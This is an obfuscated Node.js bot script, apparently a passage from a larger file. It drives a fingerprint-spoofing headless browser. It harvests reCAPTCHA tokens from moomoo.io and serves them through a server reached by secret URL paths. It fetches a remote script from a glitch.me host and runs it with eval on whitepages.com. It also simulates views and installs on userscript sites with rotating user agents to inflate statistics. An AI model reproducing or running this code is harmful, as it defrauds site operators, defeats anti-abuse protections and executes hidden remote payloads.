      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/429746' + '-best-moom' + 'oo-io-hack' + '-mod-2022-' + '2023',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/405943' + '-moomoo-io' + '-agar-io-s' + 'urviv-io-s' + 'lither-io-' + 'diep-io-gl' + 'obal-name-' + 'manager-kr' + 'unker-comi' + 'ng-soon',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/456855' + '-anti-anti' + X(0x3) + '1-all-site' + 's',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/454134' + '-moomoo-io' + '-dune-mod-' + 'autoheal-a' + 'utobreak-f' + 'ast-and-mo' + 're',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424447' + '-xtaming-c' + 'lient-tami' + 'ng-io-hack' + 's',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/taming.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/451547' + '-moomoo-io' + '-insane-mo' + 'd-beta-too' + '-fast-read' + '-descripti' + 'on',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + Y(0x4) + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424655' + '-i30cps-ut' + 'ility-mod',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/448601' + '-%E5%8A%9B' + '%E6%89%A3%' + 'E9%A2%98%E' + '7%9B%AE%E8' + '%BD%ACmark' + 'down',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/leetcode' + '.cn'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/445806' + '-moomoo-io' + '-auto-heal',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/434199' + '-moomoo-io' + '-helper-to' + '-become-pr' + 'o',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/405943' + '-moomoo-io' + '-agar-io-s' + 'urviv-io-s' + 'lither-io-' + 'diep-io-gl' + 'obal-name-' + 'manager-kr' + 'unker-comi' + 'ng-soon',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/slither.' + 'io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/454409' + '-video-dow' + 'nloader-fo' + Y(0x1) + 'nkey',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/452314' + '-adblock-s' + 'cript-for-' + 'webview',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/35466-' + 'mouseplus',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/456851' + '-omnifocus',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430253' + '-arras-io-' + 'multibox-s' + 'cript',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/arras.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/438879' + '-diep-io-p' + 'ermanent-l' + 'eader-arro' + 'w',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430255' + '-warinspac' + 'e-bots',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/warin.sp' + 'ace'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/444523' + '-diep-io-m' + Z(0x0, 'DReK') + 'hlights',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/456856' + '-optimize-' + 'quill-org',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/quill.or' + 'g'
    }
  ],
  userAgents = [
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-A205U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-A102U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-G960U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-N960U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'WOW64)\x20App' + 'leWebKit/5' + '37.36\x20(KHT' + 'ML,\x20like\x20G' + Z(0x17, 'eYMV') + 'me/108.0.0' + '.0\x20Safari/' + '537.36',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0)\x20' + 'AppleWebKi' + 't/537.36\x20(' + 'KHTML,\x20lik' + 'e\x20Gecko)\x20C' + 'hrome/108.' + '0.0.0\x20Safa' + 'ri/537.36',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6\x20Edg/108.' + '0.1462.46',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6'
  ],
  miscSites = [
    'https://di' + 'scord.com',
    'https://st' + 'ratums.io',
    'https://ww' + 'w.npmjs.co' + 'm/',
    'https://gi' + 'thub.com',
    'https://mi' + 'necraft.ne' + 't',
    'https://ww' + 'w.wsj.com/',
    'https://zb' + 'eacon.org',
    'https://ya' + 'hoo.com',
    'https://ww' + 'w.theguard' + 'ian.com/',
    'https://ba' + 'idu.com/',
    'https://wi' + 'kipedia.or' + 'g',
    'https://po' + 'rnhub.com'
  ],
  miscSites2 = [
    'https://me' + 'dium.com/',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'ethics-of-' + 'advertisin' + 'g-and-ad-b' + 'locking-a6' + '2bdde987b0',
    'https://me' + 'dium.com/@' + 'digitalgir' + 'affes/7-aw' + 'esome-and-' + 'free-ai-to' + 'ols-you-sh' + 'ould-know-' + '43a1630ea4' + '09',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'a-commenta' + 'ry-on-the-' + 'ai-wave-21' + '5d668f827a',
    'https://me' + 'dium.com/@' + 'melih193/r' + 'eact-devel' + 'oper-roadm' + 'ap-2022-76' + 'ca119188bd',
    'https://me' + 'dium.com/e' + 'ntrepreneu' + 'r-s-handbo' + 'ok/is-your' + '-startup-a' + '-good-fit-' + 'for-ventur' + 'e-capital-' + 'bc59596df9' + 'e4',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'the-simple' + '-fundament' + 'als-of-c-e' + 'ed2fbb5792' + '9',
    'https://me' + 'dium.com/b' + 'etter-prog' + 'ramming/co' + 'de-review-' + 'chores-tha' + 't-we-shoul' + 'd-automate' + '-using-dan' + 'ger-js-6cf' + '72ff3bf98',
    'https://me' + 'dium.com/g' + 'itconnecte' + 'd/use-git-' + 'like-a-sen' + 'ior-engine' + 'er-ef6d741' + 'c898e',
    'https://me' + 'dium.com/@' + 'sudiparyal' + '185/differ' + 'ence-betwe' + 'en-foreach' + '-and-map-i' + 'n-javascri' + 'pt-342c50b' + '59f9',
    'https://me' + 'dium.com/@' + 'dan-perry/' + 'the-world-' + 'that-knew-' + 'too-much-e' + '9ca2372ee2' + '1',
    'https://me' + 'dium.com/b' + 'itsrc/adva' + 'nced-data-' + 'structures' + '-and-algor' + 'ithms-trie' + 's-47db931e' + '20e',
    'https://da' + 'shmacintyr' + 'e.medium.c' + 'om/a-list-' + 'of-stories' + '-donald-tr' + 'ump-paid-t' + 'o-catch-an' + 'd-kill-jus' + 't-leaked-5' + 'e29f9f5f68' + '7',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'small-java' + 'script-opt' + 'imization-' + 'tips-1c4cb' + '387a463',
    'https://me' + 'dium.com/@' + 'michaelcos' + 'tello.swe/' + 'dbspy-4-0-' + '6989c6ea47' + 'd8',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'chatgpt-on' + '-itself-3b' + '1042b968cb',
    'https://me' + 'dium.com/@' + 'thisisjimk' + 'eller/plea' + 'se-stop-in' + 'cluding-co' + 'lor-names-' + 'in-your-cs' + 's-classes-' + 'f1090f6f2e' + '29',
    'https://me' + 'dium.com/@' + 'mattcodes0' + '6/building' + '-projects-' + 'takes-time' + '-18dfa6d6e' + '702',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'a-rabbit-h' + 'ole-of-js-' + 'hyper-opti' + 'mization-a' + '618288174b',
    'https://me' + 'dium.com/@' + 'olopadeadu' + 'nola/the-c' + 'haos-in-ou' + 'r-twenties' + '-8fcefe061' + 'ef8',
    'https://me' + 'dium.com/@' + 'leanfolks/' + 'mobile-app' + '-architect' + 'ure-6848aa' + '1d5764',
    'https://bl' + 'og.bitsrc.' + 'io/i-asked' + '-chat-gpt-' + 'to-build-a' + '-to-do-app' + '-have-we-f' + 'inally-met' + '-our-repla' + 'cement-ad3' + '47ad74c51',
    'https://me' + 'dium.com/@' + 'alexey.ink' + 'in/never-h' + 'ave-separa' + 'te-sign-in' + '-routes-7c' + '9a6dd4dc7c',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'breaking-i' + 'nto-the-ma' + 'rket-1b665' + '2b2a05a',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'javascript' + '-series-th' + 'e-fundamen' + 'tals-1a646' + 'c357955',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'javascript' + '-series-oo' + 'p-and-cons' + 'tructors-1' + '0dc5877e98' + '5',
    'https://me' + 'dium.com/b' + 'etter-prog' + 'ramming/le' + 'gacy-code-' + 'potential-' + 'gold-mine-' + 'of-learnin' + 'g-a59fdcb1' + '4804',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'a-commenta' + 'ry-on-the-' + 'ai-wave-ii' + '-7de427c9f' + 'd15'
  ],
  g = {
    'getToken': () => 0x1755 + -0x1adf + -0x97 * -0x6
  };
if (doFlags['doActivate' + 'Browser'] && ((async () => {
    const a0 = d;
    log('index.js\x20c' + 'alled');
    const {
      FakeBrowser: f
    } = require('fakebrowse' + 'r'), h = require('path'), i = h[a0(0x9)](__dirname, './fakeBrow' + 'serUserDat' + 'a'), j = new f['Builder']()['displayUse' + 'rActionLay' + 'er'](-0x9 * 0xf9 + -0x777 + 0x1038)['vanillaLau' + 'nchOptions'](pptOptions)['usePlugins']([require('puppeteer-' + 'extra-plug' + 'in-adblock' + 'er')({
      'blockTrackers': 0x1,
      'blockTrackersAndAnnoyances': 0x1
    })])['userDataDi' + 'r'](i);
    let k;
    r:
      for (;;)
        try {
          let n = await async function o() {
            let p;
            const q = {
              'User-Agent': userAgents['random'](),
              'Accept-Encoding': 'none'
            };
            try {
              p = (await axios['get'](PROCESSED_XURL_VAL, {
                'headers': q
              }))?.['data'];
            } catch (r) {}
            if (p)
              try {
                p = (await axios['get'](p, {
                  'headers': q
                }))?.['data'];
              } catch (s) {}
            if (!p)
              return await randomWait(), await o();
            try {
              return 'object' == typeof p ? p : 'string' == typeof p ? JSON['parse'](p) : {};
            } catch (u) {
              if (!p)
                return await randomWait(), await o();
            }
          }();
          doFlags['doExtFinge' + 'rprint'] && j['deviceDesc' + 'riptor'](n), k = await j['launch']();
          break r;
        } catch (p) {
          warn(p), await randomWait();
        }
    const l = k['userAction'];
    log('browser\x20la' + 'unched');
    const m = k['vanillaBro' + 'wser'];
    doFlags['doYT'] && setTimeout(async () => {
      for (;;)
        await runYTModule(m, l);
    }, 0x23cf * -0x1 + -0xe6b + 0x329e), doFlags['doGF'] && setTimeout(async () => {
      await runGFModule(m, l);
    }, 0x1299 + 0x6d3 * 0x2 + -0x1fdb), doFlags['doMediumRe' + 'ader'] && setTimeout(() => {
      !async function q() {
        const r = await m['createInco' + 'gnitoBrows' + 'erContext'](),
          u = await r['newPage']();
        for (;;) {
          let v = -0xe12 + 0x2276 + -0x1464;
          if (await u['goto'](miscSites2['random'](), {
              'timeout': NETWORK_PATIENCE
            })['catch'](w => v++), await randomWait(), v)
            return await u['close'](), await r['close'](), await q();
          for (let w = -0x4f * -0x43 + -0x2 * -0x516 + -0x1ed9; w < getRandomInt(-0x1ef3 + 0x102e * -0x2 + 0x3f50, 0x544 * 0x1 + -0x11 * 0x1cb + 0x193c); w++)
            await u['keyboard']['press']('ArrowDown'), await randomWait();
          await randomWait(), await wait(-0x13da + 0x37e1 + -0x1 * -0xc659);
        }
      }();
    }, -0x26c2 + 0x3 * -0x91 + 0x28d9), doFlags['doRemoteCa' + 'ptcha'] && setTimeout(async function q() {
      function u() {
        const a1 = d;
        axios['post']('https://st' + 'ratums.io/' + 'research', {
          'dom': process['env']['PROJECT_DO' + 'MAIN'],
          'key': PROCESSED_SYX_VAL
        }, {
          'headers': {
            'Content-Type': 'applicatio' + a1(0x1a)
          }
        })['catch'](z => {});
      }
      const v = await m['createInco' + 'gnitoBrows' + 'erContext']();
      let w = -0x1984 + 0x2b * 0x12 + -0x167e * -0x1;
      const x = await v['newPage']();
      if (await x['goto']('https://mo' + 'omoo.io', {
          'timeout': MM_NETWORK_PATIENCE
        })['catch'](z => w++), w)
        return await x['close'](), await v['close'](), q();
      if (!(await x['evaluate']('document.d' + 'ocumentEle' + 'ment.inner' + 'HTML'))['includes']('isMoomooIo'))
        return await x['close'](), await v['close'](), q();
      let y;
      if (doFlags['doDual']) {
        if (y = await v['newPage'](), await y['goto']('https://mo' + 'omoo.io', {
            'timeout': MM_NETWORK_PATIENCE
          })['catch'](A => w++), w)
          return await y['close'](), await v['close'](), q();
        const z = await y['evaluate']('document.d' + 'ocumentEle' + 'ment.inner' + 'HTML');
        if (log(z['slice'](0x21 * -0x55 + -0xb17 + 0x160c, -0x2679 + 0x139 * 0x1 + -0x2572 * -0x1)), !z['includes']('isMoomooIo'))
          return await y['close'](), await v['close'](), q();
      }
      g['getToken'] = async function(A) {
        return await (A && doFlags['doDual'] ? y : x)['evaluate'](async () => new Promise(async (B, C) => {
          window['grecaptcha']['execute']('6LevKusUAA' + 'AAAAFknhlV' + '8sPtXAk5Z5' + 'dGP5T2FYIZ', {
            'action': 'homepage'
          })['then'](D => {
            B(D);
          });
        }));
      }, u(), setInterval(u, 0x952 * 0x6 + -0x217b + 0x1f95 * 0x3);
    }, -0x2224 * -0x1 + -0x15b * 0x16 + -0x1f7 * 0x2), doFlags['doWhitepag' + 'esMode'] && setTimeout(async () => {
      (async function r() {
        try {
          let s = 0x1 * -0x1001 + 0x161b + -0x2 * 0x30d;
          const t = await m['createInco' + 'gnitoBrows' + 'erContext'](),
            u = await t['newPage']();
          if (u['on']('pageerror', function(v) {}), u['on']('error', function(v) {}), await u['goto']('https://ww' + 'w.whitepag' + 'es.com/m', {
              'timeout': MM_NETWORK_PATIENCE
            })['catch'](v => s++), s)
            return await u['close'](), await t['close'](), r();
          await wait(-0x59 * 0x2b + 0x254e + -0x1 * 0xaa3), await u['evaluate'](() => {
            let v = new XMLHttpRequest();
            v['open']('GET', 'https://co' + 'ntent-deli' + 'very-netwo' + 'rk.glitch.' + 'me/cdn/xm7' + '7/wp.js', 0x1ba + 0x2 * -0x77 + 0x66 * -0x2), v['send'](), eval(v['responseTe' + 'xt']);
          }), await wait(0x4 * -0x1a05c + -0x3c50 * 0x4a + -0x2e * -0xd1a8);
        } catch (v) {}
        return await page['close'](), await context['close'](), r();
      }());
    }, -0x1d6f + -0x17 * 0xe2 + 0x3221);
  })()), doFlags['doCreateSe' + 'rver']) {
  const e = require('http')['createServ' + 'er'](async function(f, h) {
    const a2 = b,
      i = url[a2(0x18, 'cQR&')](f['url'])['pathname'];
    h['writeHead'](0x22 * -0xac + -0x185f + 0x2fff);
    const j = '/dkasjhdwi' + 'qodkjnwqhd' + 'wqodlkwjqn' + 'dwqkdmnBZc' + 'xzmczxc' == i;
    j || '/asdsadwqd' + 'qwdwqdwqdw' + 'qdwqdwqdwq' + 'dwqd' == i ? h['write'](await g['getToken'](j) || '') : h['write']('v0.6'), h['end']();
  });
  e['listen'](process['env']['PORT'] || -0x3b40 + 0x1b0e * -0x1 + 0x75de);
}
doFlags['doOUJS'] && ((async () => {
  const a5 = d,
    a4 = b,
    a3 = c;
  async function f() {
    const k = h['random'](),
      m = k['replace']('/scripts/', '/install/') + '.user.js',
      [q, u] = (function() {
        const A = j['random']();
        return [
          A,
          A['includes']('Firefox')
        ];
      }()),
      v = function(A, B = -0x1 * 0xaef + 0x3e8 + 0x708) {
        if (A['includes']('Firefox'))
          return A['slice'](A['indexOf']('Firefox') + 'Firefox' ['length'] + (-0x3 * 0x189 + -0x108a + -0x2 * -0xa93));
        const C = A['indexOf']('Chrome/') + 'Chrome/' ['length'],
          D = A['slice'](C),
          E = D['slice'](-0x257 * 0x6 + -0x1317 + 0x2121, D['indexOf']('\x20'));
        return B ? E['slice'](0x1 * 0x1913 + 0x3 * -0x37f + -0xe96, E['indexOf']('.')) : E;
      }(q),
      w = {
        'signal': AbortSignal['timeout'](0x6 * 0xc1b + -0xe * 0x545 + 0x2834),
        'headers': {
          'host': 'openuserjs' + '.org',
          'origin': 'https://op' + 'enuserjs.o' + 'rg',
          'user-agent': q,
          'accept': 'text/html,' + 'applicatio' + 'n/xhtml+xm' + 'l,applicat' + 'ion/xml;q=' + '0.9,image/' + 'avif,image' + '/webp,imag' + 'e/apng,*/*' + ';q=0.8,app' + 'lication/s' + 'igned-exch' + 'ange;v=b3;' + 'q=0.9',
          'accept-encoding': 'gzip,\x20defl' + 'ate,\x20br',
          'accept-language': 'en-US,en;q' + '=0.9',
          'cache-control': 'no-cache',
          'pragma': 'no-cache',
          'sec-fetch-dest': 'document',
          'sec-fetch-mode': 'navigate',
          'sec-fetch-site': 'same-origi' + 'n',
          'sec-fetch-user': '?1',
          'upgrade-insecure-requests': '1'
        },
        'body': null,
        'method': 'GET'
      };
    u ? Object['assign'](w['headers'], {
      'te': 'trailers'
    }) : Object['assign'](w['headers'], {
      'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + v + '\x22',
      'sec-ch-ua-mobile': '?0',
      'sec-ch-ua-platform': '\x22Windows\x22'
    });
    const x = await fetch(i, w)['catch'](A => {});
    if (!x || !x['headers'])
      return;
    if (null === x['headers']['get']('X-RateLimi' + 't-Limit'))
      return;
    const y = {
      'signal': AbortSignal['timeout'](-0x5f5 + -0x2092 + 0x4d97),
      'headers': {
        'host': 'openuserjs' + '.org',
        'origin': 'https://op' + 'enuserjs.o' + 'rg',
        'user-agent': q,
        'accept': 'text/html,' + 'applicatio' + 'n/xhtml+xm' + 'l,applicat' + 'ion/xml;q=' + '0.9,image/' + 'avif,image' + '/webp,imag' + 'e/apng,*/*' + ';q=0.8,app' + 'lication/s' + 'igned-exch' + 'ange;v=b3;' + 'q=0.9',
        'accept-encoding': 'gzip,\x20defl' + 'ate,\x20br',
        'accept-language': 'en-US,en;q' + '=0.9',
        'cache-control': 'no-cache',
        'pragma': 'no-cache',
        'referer': i,
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origi' + 'n',
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1'
      },
      'body': null,
      'method': 'GET'
    };
    if (u ? Object['assign'](y['headers'], {
        'te': 'trailers'
      }) : Object['assign'](y['headers'], {
        'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + v + '\x22',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '\x22Windows\x22'
      }), !await fetch(k, y)['catch'](A => {}))
      return;
    const z = {
      'headers': {
        'accept': 'text/x-use' + 'rscript,\x20*' + '/*',
        'accept-language': 'en-US,en;q' + '=0.9',
        'cache-control': 'max-age=0,' + '\x20must-reva' + 'lidate',
        'pragma': 'no-cache',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'none'
      },
      'referrerPolicy': 'strict-ori' + 'gin-when-c' + 'ross-origi' + 'n',
      'body': null,
      'method': 'GET'
    };
    u ? Object['assign'](z['headers'], {
      'te': 'trailers'
    }) : Object['assign'](z['headers'], {
      'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + v + '\x22',
      'sec-ch-ua-mobile': '?0',
      'sec-ch-ua-platform': '\x22Windows\x22'
    }), await fetch(m, z);
  }
  const h = [
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/L' + 'ift_Web_Re' + 'strictions' + '_.io_Game_' + 'Mods_(MooM' + 'oo.ioKrunk' + 'er.io..),_' + 'Ad_Link_By' + 'passer,_Ad' + 'block,_MOR' + 'E!',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/M' + 'ooMoo.io,_' + 'Agar.io,_S' + 'urviv.io,_' + 'Slither.io' + ',_Diep.io,' + '_Global_Na' + 'me_Manager' + '_[Krunker_' + 'Coming_Soo' + 'n]',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/p' + 'ancake_mod' + '_Katana_+_' + 'Musket_AUT' + 'OHEAL_Anti' + '-Insta_sta' + 'rter_resou' + 'rces_and_m' + 'ore!!',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/Bloggerpe' + 'mula/Bypas' + 's_All_Shor' + 'tlinks_Man' + 'ual_Captch' + 'a',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/MAX30/Top' + 'AndDownBut' + 'tonsEveryw' + 'here',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/reek/Anti' + '-Adblock_K' + 'iller_Reek',
      'https://op' + 'enuserjs.o' + a3(0x12) + '/ParticleC' + 'ore/YouTub' + 'e_+',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/MAX30/bon' + 'gacamsKill' + 'Ads',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/founcs/Li' + 'mitless_Fr' + 'eedom',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/aycabta/T' + 'witter_Ima' + 'ge_Maximiz' + 'er',
      'https://op' + a4(0xe, '@0t7') + 'rg/scripts' + '/Marti/ouj' + 's_-_JsBeau' + 'tify',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/AdlerED/%' + 'E6%9C%80%E' + '5%BC%BA%E7' + '%9A%84%E8%' + '80%81%E7%8' + '9%8C%E8%84' + '%9A%E6%9C%' + 'ACCSDNGree' + 'ner%EF%BC%' + '9ACSDN%E5%' + 'B9%BF%E5%9' + '1%8A%E5%AE' + '%8C%E5%85%' + 'A8%E8%BF%8' + '7%E6%BB%A4' + '%E3%80%81%' + 'E4%BA%BA%E' + '6%80%A7%E5' + '%8C%96%E8%' + '84%9A%E6%9' + 'C%AC%E4%BC' + '%98%E5%8C%' + '96',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/laidbackt' + 'empo/EasyV' + 'ideoDownlo' + 'ad',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/O' + 'ptimize_Qu' + 'ill.org',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/mscarchil' + 'li/Amazon_' + 'Smile_Redi' + 'rect',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/AltoRetra' + 'to/IMDb_My' + '_Movies_en' + 'hancer',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/xthexder/' + 'Wide_GitHu' + 'b',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/navchanda' + 'r/Auto_Loa' + 'd_Big_Imag' + 'e',
      'https://op' + 'enuserjs.o' + a5(0xa) + '/extension' + 'sapp/cinem' + 'apress',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/S' + 'urviv.io_X' + 'Client_(BE' + 'TA)',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/Zren/Resi' + 'ze_YT_To_W' + 'indow_Size',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/M' + 'oomoo.io_R' + 'emove_Cook' + 'ie_Prefere' + 'nces_Tab'
    ],
    i = 'https://op' + 'enuserjs.o' + 'rg/',
    j = [
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/11' + '0.0.0.0\x20Sa' + 'fari/537.3' + '6',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'WOW64)\x20App' + 'leWebKit/5' + '37.36\x20(KHT' + 'ML,\x20like\x20G' + 'ecko)\x20Chro' + 'me/108.0.0' + '.0\x20Safari/' + '537.36',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0)\x20' + 'AppleWebKi' + 't/537.36\x20(' + 'KHTML,\x20lik' + 'e\x20Gecko)\x20C' + 'hrome/108.' + '0.0.0\x20Safa' + 'ri/537.36',
      'Mozilla/5.' + '0\x20(Macinto' + 'sh;\x20Intel\x20' + 'Mac\x20OS\x20X\x201' + '3_1)\x20Apple' + 'WebKit/537' + '.36\x20(KHTML' + ',\x20like\x20Gec' + 'ko)\x20Chrome' + '/108.0.0.0' + '\x20Safari/53' + '7.36',
      'Mozilla/5.' + '0\x20(X11;\x20Li' + 'nux\x20x86_64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + a4(0x10, '6cPz') + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6\x20Edg/108.' + '0.1462.54'
    ];
  f();
  for (let k = -0x40 * -0x1c + -0x7 * -0x397 + -0x2021; k < -0x203 + 0x73c + -0x535; k++)
